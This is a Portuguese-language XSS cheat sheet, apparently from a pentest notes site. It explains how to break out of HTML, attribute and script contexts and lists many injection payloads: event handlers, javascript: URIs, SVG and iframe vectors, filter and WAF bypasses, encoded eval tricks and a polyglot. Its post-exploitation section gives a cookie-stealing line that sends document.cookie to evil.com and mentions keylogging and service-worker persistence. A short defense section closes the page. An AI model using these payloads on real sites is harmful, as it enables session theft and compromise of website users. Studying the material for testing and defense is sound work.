---
description: Cross-site Scripting 3xposed!
---

# XSS

O **Cross-Site Scripting (XSS)** não é uma falha de "código"; é uma falha de **confiança**.

O mecanismo fundamental da web é: seu navegador confia no servidor (ex: `banco.com`) e executa qualquer código (HTML, JavaScript) que ele envia. O XSS explora isso ao enganar o servidor para que ele envie um código _do atacante_ (injetado) junto com o código legítimo.

O navegador da vítima recebe esse _payload_ e o executa, pois ele "veio" do `banco.com` e o navegador não tem como saber que aquele pedaço do código não é legítimo.

_**Entender**_ como <mark style="color:$warning;">quebrar o contexto</mark> é o cerne do XSS.

O seu objetivo não é apenas "_fechar a expressão_", mas sim <mark style="color:$danger;">neutralizar o código legítimo restante</mark> para que o seu _payload_ possa ser executado _sem erros de sintaxe_.

Além do ponto e vírgula (`;`) e do comentário de linha (`//`), que são os mais comuns, o método que você vai usar depende 100% do contexto onde seu _payload_ é inserido.

#### **Genérico (contexto HTML)**

Quando sua entrada é refletida diretamente no corpo HTML sem ser encapsulada em nenhuma tag ou atributo específico, você tem mais flexibilidade para exploração.&#x20;

Comece de forma simples com cargas úteis como:

```
<script>alert(1)</script>
```

```
<img src=x onerror=alert(1)>
```

Ambas as cargas mencionadas acima funcionarão sem a necessidade de sair de nenhuma tag. Você pode usar praticamente qualquer tag HTML que suporte execução JavaScript, incluindo `<svg>`, `<iframe>`, `<object>`, ou atributos do manipulador de eventos em tags de fechamento automático.

***

#### **Atributo HTML (HTML inline)**

Quando seu  XSS reflected aparece dentro de um atributo HTML (como `<input value="REFLECTION">` ou `<form action="/path/to/submit?param1=REFLECTION">`), você precisará sair do contexto do atributo antes de injetar seu payload.

Você pode fechar o atributo com uma aspas ou fechar a tag inteira com `>`, e então injete uma nova tag maliciosa como `"><script>alert(1)</script>`, ou permaneça dentro da mesma tag adicionando um manipulador de eventos como `" onload=alert(1) x="`.

A chave é entender qual tipo de aspas (simples ou dupla) é usado para envolver o atributo e se o aplicativo filtra quaisquer outros caracteres que possam nos impedir de escapar do contexto.

***

## Cheat Sheet

### 1. Vetores de Origem e Contextos (Triggers)

Como e onde a injeção acontece baseado no contexto do código HTML/JS.

#### Contexto de Script (`<script>...`)

Quando a entrada reflete dentro de tags de script existentes.

*   **Quebra de String:**

    ```javascript
    ';alert(1)//
    ";alert(1)//
    \';alert(1)//
    ```
*   **Quebra de Tag (Break):**

    ```html
    </script><svg/onload=alert(1)>
    ```
*   **Quebra de `Aspas`:**

    ```javascript
    alert`1`
    `${alert(1337)}`
    \u{0000000000000061}lert(1337)
    setTimeout(name)
    -{valueOf:location,toString:[].pop,0:/javascript:alert%281%29/.source,length:1}(IE)
    ```

    *   **Break:**

        ```javascript
        eat backlash: %bb"alert(1337) (GBK charset)
        "<!--<script>" 
        ```

#### Contexto de Atributo

Quando a entrada reflete dentro de atributos de tags HTML.

*   **Event Handlers (Inline):**

    ```html
    <tag onmouseover="alert(1)">
    <tag onfocus="alert(1)" autofocus>
    <tag onclick="alert(1)">
    ```
*   **Protocolo `javascript:` (Href/Src):**

    ```html
    <a href="javascript:alert(1)">Click me</a>
    <iframe src="javascript:alert(1)"></iframe>
    ```
* **Atalhos e Obfuscação:**
  * Usando HTML Entities: `&#106;avascript:alert(1)`
  * Usando URL Encode: `%6a%61%76%61...`
*   **Estilos (Style - Legado/IE):**

    ```css
    style="behavior:url(test.htc)"
    style="width:expression(alert(1))"
    ```

#### Tags Mágicas e Especiais

Tags que executam scripts automaticamente ou permitem vetores exóticos.

*   **SVG (Scalable Vector Graphics):**

    ```html
    <svg/onload=alert(1)>
    <svg><script>alert(1)</script></svg>
    ```
*   **Iframe:**

    ```html
    <iframe src="javascript:alert(1)"></iframe>
    <iframe onload="alert(1)"></iframe>
    <iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
    ```
*   **Object / Embed:**

    ```html
    <object data="javascript:alert(1)"></object>
    <embed src="javascript:alert(1)"></embed>
    ```
*   **Tags de Mídia (Error Events):**

    ```html
    <img src=x onerror=alert(1)>
    <video src=x onerror=alert(1)>
    <audio src=x onerror=alert(1)>
    ```
*   **Input (Auto Focus):**

    ```html
    <input onfocus=alert(1) autofocus>
    ```

***

### 2. DOM XSS

Vulnerabilidades que ocorrem no processamento do lado do cliente (Client-side).

#### Fontes (Sources)

Onde o atacante controla a entrada de dados.

* `location.href`
* `location.search`
* `location.hash` (fragmento da URL #)
* `document.cookie`
* `document.referrer`
* `window.name`
* `localStorage` / `sessionStorage`

#### Sumidouros (Sinks / Triggers)

Onde a execução do código malicioso acontece.

* **Execução Direta:**
  * `eval()`
  * `setTimeout()`
  * `setInterval()`
  * `Function()`
* **Manipulação de HTML:**
  * `innerHTML`
  * `outerHTML`
  * `document.write()`
  * `document.writeln()`
* **Navegação:**
  * `location.replace()`
  * `location.assign()`

#### Frameworks Específicos

* **jQuery:**
  * Uso perigoso de seletores `$()` com location hash.
  * `.html()`, `.append()`
* **React:**
  * Uso de `dangerouslySetInnerHTML`.
* **Angular:**
  * Bypass de sanitização ou injeção de template.

***

### 3. Bypass e WAF Evasion (POC)

Técnicas para contornar filtros e limitações de tamanho.

#### Bypass de Limite de Caracteres (Length Limit)

Quando o input é muito curto.

1.  **Concatenação de Variáveis:**

    ```html
    <script>a="al";b="ert";c="(1)";eval(a+b+c)</script>
    ```
2.  **Uso de `window.name`:**

    ```html
    <script>eval(name)</script>
    ```
3.  **Hash da URL:**

    ```html
    <script>eval(location.hash.slice(1))</script>
    ```

#### Bypass de Filtros (Keywords e Tags)

* **Case Sensitivity:** `<ScRiPt>alert(1)</sCrIpT>`
* **Espaços e Barras:** `<img/src=x/onerror=alert(1)>`
* **Codificação:**
  * JS Unicode: `\u0061lert(1)`
  * HTML Decimal: `&#97;lert(1)`
  * Base64 (se houver decode): `eval(atob('YWxlcnQoMSk='))`
* **Tags Aninhadas (Filter Stripping):**
  * `<scr<script>ipt>alert(1)</script>`

#### Ocultação de Payload

* **Comentários:** \`\`
*   **Polyglots:** Payloads que funcionam em múltiplos contextos (HTML, JS, Atributo).

    ```
    javascript://%250Aalert(1)//" onload=alert(1)//
    ```

***

### 4. Exploração e Pós-Exploração (Exp)

O que fazer após conseguir a execução de JavaScript.

#### Roubo de Informações

* **Cookies:** `new Image().src='http://evil.com?c='+document.cookie`
* **Keylogging:** Monitorar eventos de teclado e enviar para servidor externo.
* **Captura de Tela:** Usando HTML5 Canvas ou bibliotecas como html2canvas.

#### Persistência

* **Service Workers:** Registrar um SW malicioso para interceptar requisições futuras.
* **Web Storage:** Salvar payload no LocalStorage para execução recorrente.
* **Cache Poisoning:** Forçar o cache de arquivos JS envenenados.

#### Ferramentas (Tools)

* **Burp Suite:** Scanner e repetidor.
* **XSSer:** Automação de ataques.
* **BeEF (Browser Exploitation Framework):** Framework completo para hooks de navegadores.
* **XSStrike:** Fuzzer avançado de XSS.

***

### 5. Prevenção (Defesa)

* **Input Sanitization:** Limpar a entrada (remover caracteres perigosos).
* **Output Encoding:** Codificar a saída de acordo com o contexto (HTML Entity Encode, URL Encode, JS Encode).
* **CSP (Content Security Policy):**
  * Restringir fontes de scripts (`script-src 'self'`).
  * Desabilitar `unsafe-inline` e `unsafe-eval`.
* **HttpOnly Cookies:** Impedir acesso ao cookie via `document.cookie`.
